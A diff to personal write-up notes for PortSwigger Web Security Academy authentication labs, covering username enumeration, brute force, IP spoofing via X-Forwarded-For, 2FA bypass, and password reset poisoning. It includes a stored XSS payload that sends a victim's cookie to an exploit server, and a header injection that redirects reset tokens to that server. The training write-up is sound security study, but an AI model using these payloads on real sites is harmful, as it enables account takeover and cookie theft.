@@ -18,9 +18,10 @@
 # Username enumeration via different responses
 Reference: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
 
-<!-- omit in toc -->
-### Quick Solution
+```ad-hint
+title: Quick Solution
 This lab allows username enumeration and password bruteforce. When the username is wrong the error message is ``Invalid Username`` while when the password is wrong the error message is ``Incorrect password``. Given the wordlist of usernames and passwords it is quite easy to solve.
+```
 
 ```ad-done
 title: Solution
@@ -43,10 +44,10 @@ title: Solution
 # Username enumeration via subtly different responses
 Reference: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses
 
-<!-- omit in toc -->
-### Quick Solution
+```ad-hint
+title: Quick Solution
 In this case the message is generic when the username and/or the password are wrong. But there is a subtle difference between the case when both are wrong and only the password is wrong (``Invalid username or password.`` vs ``Invalid username or passowrd``). Using this difference the username can be enumerated and then the password for that user can be easily bruteforced.
-
+```
 ```ad-done
 title: Solution
 1. With Burp running, submit an invalid username and password. Send the ``POST /login`` request to Burp Intruder and add a payload position to the ``username`` parameter.
@@ -66,10 +67,10 @@ title: Solution
 # Username enumeration via response timing
 Reference: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing
 
-<!-- omit in toc -->
-### Quick Solution
+```ad-hint
+title: Quick Solution
 This lab is a little bit tricky. The IP is blocked if too many requyests are made. To overcome this issue the ``X-Forwarded-For`` header can be used to spoof the IP address. Using a ``Pitchfork`` attack the right username can be retrieved looking at the time response. Once we found the username we can easily bruteforce the password.
-
+```
 ```ad-done
 title: Solution
 1. With Burp running, submit an invalid username and password, then send the ``POST /login`` request to Burp Repeater. Experiment with different usernames and passwords. Notice that your IP will be blocked if you make too many invalid login attempts.
@@ -104,10 +105,10 @@ title: Solution
 # Username enumeration via account lock
 Reference: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock
 
-<!-- omit in toc -->
-### Quick Solution
+```ad-hint
+title: Quick Solution
 This website locks an account if it receives to many login attempts. This feature can be used to retrieve the ``username`` of a valid user. Once we found the username we can try to bruteforce the password; even if th web app locks the account when trying with the right credentials there is no error message. Wait for one minute and then login.
-
+```
 ```ad-done
 title: Solution
 1. With Burp running, investigate the login page and submit an invalid username and password. Send the ``POST /login`` request to Burp Intruder.
@@ -139,9 +140,10 @@ title: Solution
 Reference: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic
 
 <!-- omit in toc -->
-### Quick Solution
+```ad-hint
+title: Quick Solution
 First make sure a MFA-code verification code is generated for user ``carlos`` by issuing a GET request to ``login2``, then bruteforce the POST request to ``login2`` using the *Payload type: Brute forcer*.
-
+```
 ```ad-done
 title: Solution
 1. With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the ``POST /login2`` request, the ``verify`` parameter is used to determine which user's account is being accessed.
@@ -157,14 +159,14 @@ title: Solution
 # Brute-forcing a stay-logged-in cookie
 Reference: https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie
 
-<!-- omit in toc -->
-### Quick Solution
+```ad-hint
+title: Quick Solution
 The **Stay logged in** cookie is constructed as follows:
 
 		base64(username+':'+md5HashOfPassword)
 
 So it can be easily bruteforced.
-
+```
 ```ad-done
 title: Solution
 1. With Burp running, log in to your own account with the Stay logged in option selected. Notice that this sets a ``stay-logged-in`` cookie.
@@ -200,11 +202,11 @@ title: Solution
 3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
 4. Go to the exploit server and make a note of the URL.
 5. Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:
-~~~html
-<script>document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie</script>
-~~~
-6. On the exploit server, open the access log. There should be a GET request from the victim containing their ``stay-logged-in`` cookie.
-7. Decode the cookie in Burp Decoder. The result will be:
+	~~~html
+	<script>document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie</script>
+	~~~
+1. On the exploit server, open the access log. There should be a GET request from the victim containing their ``stay-logged-in`` cookie.
+2. Decode the cookie in Burp Decoder. The result will be:
 
 		carlos:26323c16d5f4dabff3bb136f2460a943
 
@@ -215,10 +217,10 @@ title: Solution
 # Password reset broken logic
 Reference: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic
 
-<!-- omit in toc -->
-### Quick Solution
+```ad-hint
+title: Quick Solution
 This lab has a vulnerable password reset functionality. The link received by email is **reusable** and can also target every user just by changing the ``username`` parameter.
-
+```
 ```ad-done
 title: Solution
 1. With Burp running, click the Forgot your password? link and enter your own username.
@@ -233,24 +235,24 @@ title: Solution
 # Password reset poisoning via middleware
 Reference: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
 
-<!-- omit in toc -->
-### Quick Solution
+```ad-hint
+title: Quick Solution
 Use the ``X-Forwarded-Host`` header on the password reset functionality to send a password reset email with a malicious endpoint. Retrieve the token generated for user ``carlos`` and use it to reset his password.
-
+```
 ```ad-done
 title: Solution
 1. With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email.
 2. Send the ``POST /forgot-password`` request to Burp Repeater. Notice that the ``X-Forwarded-Host`` header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.
 3. Go to the exploit server and make a note of your exploit server URL.
 4. Go back to the request in Burp Repeater and add the ``X-Forwarded-Host`` header with your exploit server URL:
-~~~html
-X-Forwarded-Host: your-exploit-server-id.web-security-academy.net
-~~~
-5. Change the ``username`` parameter to ``carlos`` and send the request.
-6. Go to the exploit server and open the access log. You should see a ``GET /forgot-password`` request, which contains the victim's token as a query parameter. Make a note of this token.
-7. Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into your browser and change the value of the ``temp-forgot-password-token`` parameter to the value that you stole from the victim.
-8. Load this URL and set a new password for Carlos's account.
-9. Log in to Carlos's account using the new password to solve the lab.
+	~~~html
+	X-Forwarded-Host: your-exploit-server-id.web-security-academy.net
+	~~~
+1. Change the ``username`` parameter to ``carlos`` and send the request.
+2. Go to the exploit server and open the access log. You should see a ``GET /forgot-password`` request, which contains the victim's token as a query parameter. Make a note of this token.
+3. Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into your browser and change the value of the ``temp-forgot-password-token`` parameter to the value that you stole from the victim.
+4. Load this URL and set a new password for Carlos's account.
+5. Log in to Carlos's account using the new password to solve the lab.
 ```
 
 # Password brute-force via password change
